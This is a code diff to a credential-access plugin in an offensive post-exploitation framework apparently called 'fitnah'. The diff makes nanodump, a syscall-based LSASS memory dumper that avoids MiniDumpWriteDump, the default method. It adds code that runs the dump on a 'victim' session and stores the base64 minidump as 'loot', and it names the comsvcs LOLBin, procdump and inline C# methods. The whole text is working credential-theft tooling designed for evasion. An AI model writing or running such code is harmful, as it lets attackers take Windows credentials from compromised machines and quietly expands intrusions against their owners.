@@ -5,18 +5,21 @@ from fitnah.sdk.schema import Param, ParamSchema
 
 class LsassDump(BasePlugin):
     NAME        = "lsass_dump"
-    DESCRIPTION = "Dump LSASS via comsvcs LOLBin / ProcDump / Out-Minidump inline C#. Requires elevation."
+    DESCRIPTION = (
+        "Dump LSASS memory. Methods: nanodump (syscall, no MiniDumpWriteDump — preferred), "
+        "comsvcs (LOLBin), procdump, minidump (inline C#). Requires elevation."
+    )
     AUTHOR      = "fitnah-team"
     MITRE       = "T1003.001"
     CATEGORY    = "credential_access"
 
     schema = ParamSchema().add(
-        Param("method",       str, required=False, default="comsvcs",
-              help="comsvcs | procdump | minidump (inline C# MiniDumpWriteDump)"),
+        Param("method",       str, required=False, default="nanodump",
+              help="nanodump (default, no MiniDumpWriteDump) | comsvcs | procdump | minidump"),
         Param("out_path",     str, required=False, default="",
-              help="Output dump path (default: auto in TEMP)"),
+              help="Output dump path on victim (nanodump: omit to keep in-memory only)"),
         Param("pid_override", int, required=False, default=0,
-              help="Override LSASS PID (0 = auto-detect)"),
+              help="Override LSASS PID (0 = auto-detect; ignored by nanodump)"),
     )
 
     # Inline C# for MiniDumpWriteDump (method 3)
@@ -52,7 +55,7 @@ class LsassDump(BasePlugin):
         if session.priv_level not in ("SYSTEM", "Admin", "system", "admin"):
             return ModuleResult.err("Requires elevated privileges (SYSTEM or Admin)")
 
-        method       = params.get("method", "comsvcs").lower()
+        method       = params.get("method", "nanodump").lower()
         out_path     = params.get("out_path", "")
         pid_override = int(params.get("pid_override", 0))
         cs_src       = self._CS_MINIDUMP
@@ -69,6 +72,29 @@ class LsassDump(BasePlugin):
             "  \"$env:TEMP\\$(Get-Random).dmp\""
             "};"
         )
+
+        # ── nanodump: syscall-based, no MiniDumpWriteDump (preferred) ──────
+        if method == "nanodump":
+            args = {}
+            if out_path:
+                args["out_path"] = out_path
+            r = ctx.send("lsass_dump", args)
+            if r["status"] != "ok":
+                return ModuleResult.err(f"nanodump: {r['output']}")
+            import json as _json
+            try:
+                payload = _json.loads(r["output"])
+            except Exception:
+                return ModuleResult.err(f"nanodump: unexpected response: {r['output']}")
+            if payload.get("status") != "ok":
+                return ModuleResult.err(f"nanodump failed: {payload.get('msg','')}")
+            size_mb = round(payload.get("size", 0) / (1024 * 1024), 2)
+            data_b64 = payload.get("data", "")
+            return ModuleResult.ok(
+                data=f"[+] nanodump SUCCESS  size={size_mb} MB  (base64 minidump in loot)",
+                loot_kind="lsass_dump",
+                loot_data=data_b64,
+            )
 
         if method == "comsvcs":
             ps = (
